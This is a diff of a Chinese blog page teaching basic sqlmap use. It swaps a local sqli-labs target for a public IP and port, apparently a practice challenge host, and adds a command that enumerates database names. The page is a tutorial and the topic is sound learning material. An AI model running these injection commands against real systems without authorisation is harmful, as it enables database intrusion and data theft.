@@ -446,7 +446,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    421
+                    452
                 </div>
                 
 
@@ -483,8 +483,12 @@
 <p>很多时候使用sqlmap会使得sql注入变得更加的简单，高效，</p>
 <h3 id="使用初阶"><a href="#使用初阶" class="headerlink" title="使用初阶"></a>使用初阶</h3><p><strong>本篇博客基于windows环境进行操作</strong></p>
 <p>在安装sqlmap的文件夹下打开命令行，使用命令 </p>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1:85/sqli-labs/Less-1/?id=1&quot; -v 3</code></pre>
+<pre><code>python sqlmap.py -u &quot;http://220.249.52.133:43929/?inject=1&quot; -v 3</code></pre>
 <p><strong><em>这里的-v 3是输出等级，3代表显示注入时使用的payload，便于加深理解</em></strong></p>
+<ol start="2">
+<li>在检测出报错点后继续添加语句来爆库名</li>
+</ol>
+<pre><code>python sqlmap.py -u &quot;http://220.249.52.133:43929/?inject=1&quot; --dbs -v 3</code></pre>
 
             </div>
             <hr/>
@@ -1026,7 +1030,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.1k</span>&nbsp;字
+                class="white-color">15.9k</span>&nbsp;字
             
             
             
